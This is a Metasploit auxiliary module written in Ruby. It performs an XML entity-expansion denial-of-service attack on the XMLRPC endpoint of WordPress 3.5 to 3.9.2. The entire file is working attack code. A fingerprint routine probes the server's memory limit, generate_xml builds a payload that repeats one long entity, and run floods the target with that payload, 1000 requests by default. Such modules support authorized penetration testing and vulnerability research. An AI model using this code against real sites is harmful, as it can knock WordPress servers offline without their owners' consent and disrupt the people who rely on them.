##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::HTTP::Wordpress
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Wordpress XMLRPC DoS',
      'Description'   => %q{
        Wordpress XMLRPC parsing is vulnerable to a XML based denial of service.
        This vulnerability affects Wordpress 3.5 - 3.9.2 (3.8.4 and 3.7.4 are
        also patched).
      },
      'Author'        =>
        [
          'Nir Goldshlager',    # advisory
          'Christian Mehlmauer' # metasploit module
        ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          ['URL', 'http://wordpress.org/news/2014/08/wordpress-3-9-2/'],
          ['URL', 'http://www.breaksec.com/?p=6362'],
          ['URL', 'http://mashable.com/2014/08/06/wordpress-xml-blowup-dos/'],
          ['URL', 'https://core.trac.wordpress.org/changeset/29404'],
          ['WPVDB', '7526']
        ],
      'DisclosureDate'=> 'Aug 6 2014'
    ))

    register_options(
    [
      OptInt.new('RLIMIT', [ true, "Number of requests to send", 1000 ])
    ], self.class)

    register_advanced_options(
    [
      OptInt.new('FINGERPRINT_STEP', [true, "The stepsize in MB when fingerprinting", 8]),
      OptInt.new('DEFAULT_LIMIT', [true, "The default limit in MB", 8])
    ], self.class)
  end

  def rlimit
    datastore['RLIMIT']
  end

  def default_limit
    datastore['DEFAULT_LIMIT']
  end

  def fingerprint_step
    datastore['FINGERPRINT_STEP']
  end

  def fingerprint
    memory_to_use = fingerprint_step
    # try out the available memory in steps
    # apache will return a server error if the limit is reached
    while memory_to_use < 1024
      vprint_status("#{peer} - trying memory limit #{memory_to_use}MB")
      opts = {
        'method'  => 'POST',
        'uri'     => wordpress_url_xmlrpc,
        'data'    => generate_xml(memory_to_use),
        'ctype'   =>'text/xml'
      }

      begin
        # low timeout because the server error is returned immediately
        res = send_request_cgi(opts, timeout = 3)
      rescue ::Rex::ConnectionError => exception
        print_error("#{peer} - unable to connect: '#{exception.message}'")
        break
      end

      if res && res.code == 500
        # limit reached, return last limit
        last_limit = memory_to_use - fingerprint_step
        vprint_status("#{peer} - got an error - using limit #{last_limit}MB")
        return last_limit
      else
        memory_to_use += fingerprint_step
      end
    end

    # no limit can be determined
    print_warning("#{peer} - can not determine limit, will use default of #{default_limit}")
    return default_limit
  end

  def generate_xml(size)
    entity = Rex::Text.rand_text_alpha(3)
    doctype = Rex::Text.rand_text_alpha(6)
    param_value_1 = Rex::Text.rand_text_alpha(5)
    param_value_2 = Rex::Text.rand_text_alpha(5)

    size_bytes = size * 1024

    # Wordpress only resolves one level of entities so we need
    # to specify one long entity and reference it multiple times
    xml = '<?xml version="1.0" encoding="iso-8859-1"?>'
    xml << "<!DOCTYPE %{doctype} ["
    xml << "<!ENTITY %{entity} \"%{entity_value}\">"
    xml << ']>'
    xml << '<methodCall>'
    xml << '<methodName>'
    xml << "%{payload}"
    xml << '</methodName>'
    xml << '<params>'
    xml << "<param><value>%{param_value_1}</value></param>"
    xml << "<param><value>%{param_value_2}</value></param>"
    xml << '</params>'
    xml << '</methodCall>'

    empty_xml = xml % {
      :doctype => '',
      :entity => '',
      :entity_value => '',
      :payload => '',
      :param_value_1 => '',
      :param_value_2 => ''
    }

    space_to_fill = size_bytes - empty_xml.size
    vprint_debug("#{peer} - max XML space to fill: #{space_to_fill} bytes")

    payload = "&#{entity};" * (space_to_fill / 6)
    entity_value_length = space_to_fill - payload.length

    payload_xml = xml % {
      :doctype => doctype,
      :entity => entity,
      :entity_value => Rex::Text.rand_text_alpha(entity_value_length),
      :payload => payload,
      :param_value_1 => param_value_1,
      :param_value_2 => param_value_2
    }

    payload_xml
  end

  def run
    # get the max size
    print_status("#{peer} - trying to fingerprint the maximum memory we could use")
    size = fingerprint
    print_status("#{peer} - using #{size}MB as memory limit")

    # only generate once
    xml = generate_xml(size)

    for x in 1..rlimit
      print_status("#{peer} - sending request ##{x}...")
      opts = {
        'method'  => 'POST',
        'uri'     => wordpress_url_xmlrpc,
        'data'    => xml,
        'ctype'   =>'text/xml'
      }
      begin
        c = connect
        r = c.request_cgi(opts)
        c.send_request(r)
        # Don't wait for a response, can take very long
      rescue ::Rex::ConnectionError => exception
        print_error("#{peer} - unable to connect: '#{exception.message}'")
        return
      ensure
        disconnect(c) if c
      end
    end
  end
end
